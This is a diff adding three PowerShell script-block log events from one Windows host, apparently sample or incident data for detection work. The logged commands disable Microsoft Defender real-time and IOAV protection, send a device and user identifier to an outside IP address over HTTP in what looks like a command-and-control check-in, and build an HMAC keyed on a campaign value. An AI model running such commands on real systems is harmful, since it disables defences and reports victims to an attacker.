@@ -1,0 +1,35 @@
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:10:27.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="ScriptBlockText">Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:10:49.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="ScriptBlockText">$sid='7f4d9b2c-a9e1-4a71-bd44-70b2f4d0c661'; $dev='NOVA-FIN-044|aws_afaneh'; Invoke-WebRequest http://198.51.100.42:8080/register -Headers @{'X-Device-ID'=$dev}</Data>
+  </EventData>
+</Event>
+
+<Event>
+  <System>
+    <Provider Name="Microsoft-Windows-PowerShell"/>
+    <EventID>4104</EventID>
+    <TimeCreated SystemTime="2026-08-14T18:13:32.000Z"/>
+    <Computer>NOVA-FIN-044.thryve.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="ScriptBlockText">[System.Security.Cryptography.HMACSHA256]::new([Text.Encoding]::UTF8.GetBytes($campaign))</Data>
+  </EventData>
+</Event>
